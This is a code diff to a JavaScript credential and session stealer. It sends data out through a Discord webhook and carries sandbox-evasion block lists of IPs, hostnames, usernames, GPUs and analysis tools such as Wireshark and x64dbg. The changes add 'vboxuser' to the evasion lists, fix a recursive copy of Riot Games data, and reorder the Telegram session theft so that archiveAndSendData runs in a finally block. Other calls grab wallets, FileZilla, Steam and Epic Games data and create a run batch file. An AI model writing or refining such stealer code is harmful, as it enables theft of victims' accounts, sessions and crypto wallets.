@@ -28,8 +28,8 @@ const discordWebhookUrl = 'REMPLACE_ME';
 
 
 const blackListedIPS = ["88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137", "213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", ];
-const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
-const blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl", ]
+const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
+const blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl", ]
 const blackListedGPU = ["Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter", "K9SC88UK", "Стандартный VGA графический адаптер", ]
 const blacklistedOS = ["Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter", "Windows Server 2016 Standard", "Windows Server 2016 Datacenter"]
 const blackListedProcesses = ["watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe", "BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe", "HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe", "Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe", "Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",];
@@ -2089,6 +2089,8 @@ async function SubmitTelegram() {
         console.log('Telegram session data copied to mainFolder/Telegram');
     } catch (error) {
         console.error(`Error in SubmitTelegram: ${error.message}`);
+    } finally {
+        await archiveAndSendData();
     }
 }
 
@@ -2917,6 +2919,7 @@ async function getAutofills() {
   }
 }
    
+
 function copyriot(source, target, excludeList = []) {
     const targetFolder = path.join(target, path.basename(source));
 
@@ -2932,7 +2935,7 @@ function copyriot(source, target, excludeList = []) {
 
             if (!excludeList.some(excludedFile => curSource.includes(excludedFile))) {
                 if (fs.lstatSync(curSource).isDirectory()) {
-                    copyFolder(curSource, targetFolder, excludeList);
+                    copyriot(curSource, targetFolder, excludeList);
                 } else {
                     fs.copyFileSync(curSource, curTarget);
                 }
@@ -2940,6 +2943,7 @@ function copyriot(source, target, excludeList = []) {
         });
     }
 }
+
 
 
 async function SubmitRiotGames() {
@@ -2958,20 +2962,19 @@ async function SubmitRiotGames() {
             const riotGamesSourcePath = "C:\\ProgramData\\Riot Games";
             const riotGamesDestinationPath = path.join(mainFolderPath, 'RiotGames', 'ProgramData');
 
-          const riotGamesExcludeList = [
-              "C:\\ProgramData\\Riot Games\\Metadata\\valorant.live\\valorant.live.db",
-              "C:\\ProgramData\\Riot Games\\Metadata\\valorant.live\\valorant.live.manifest",
-              "C:\\ProgramData\\Riot Games\\Metadata\\valorant.live\\valorant.live.preview.manifest"
-          ];
+            const riotGamesExcludeList = [
+                "Metadata\\valorant.live\\valorant.live.manifest",
+                "Metadata\\valorant.live\\valorant.live.preview.manifest"
+            ];
 
-          try {
-              copyriot(riotGamesSourcePath, riotGamesDestinationPath, riotGamesExcludeList);
-              console.log(`Copied Riot Games data to ${riotGamesDestinationPath}`);
-          } catch (err) {
-            console.error(``);
-          }
+            try {
+                copyriot(riotGamesSourcePath, riotGamesDestinationPath, riotGamesExcludeList);
+                console.log(`Copied Riot Games data to ${riotGamesDestinationPath}`);
+            } catch (err) {
+                console.error(`An error occurred while copying Riot Games data: ${err.message}`);
+            }
 
-            const riotGamesLocalAppDataSourcePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Riot Games`; 
+            const riotGamesLocalAppDataSourcePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Riot Games`;
             const riotGamesLocalAppDataDestinationPath = path.join(mainFolderPath, 'RiotGames', 'AppData', 'Local');
 
             try {
@@ -2987,6 +2990,7 @@ async function SubmitRiotGames() {
         console.error(`Error in SubmitRiotGames: ${error.message}`);
     }
 }
+
 
 
 async function RiotGameSession(cookie) {
@@ -3094,7 +3098,6 @@ function onlyUnique(item, index, array) {
         localWalletData();
         submitFileZilla();
         SubmitRiotGames();
-        SubmitTelegram();
         StealEpicGames();
         SubmitSteam();
         stealSteamSession();
@@ -3104,4 +3107,4 @@ function onlyUnique(item, index, array) {
         //addRegistryKey();
         createRunBat();
         redirectErrorsToLog();
-        archiveAndSendData();
+        SubmitTelegram();
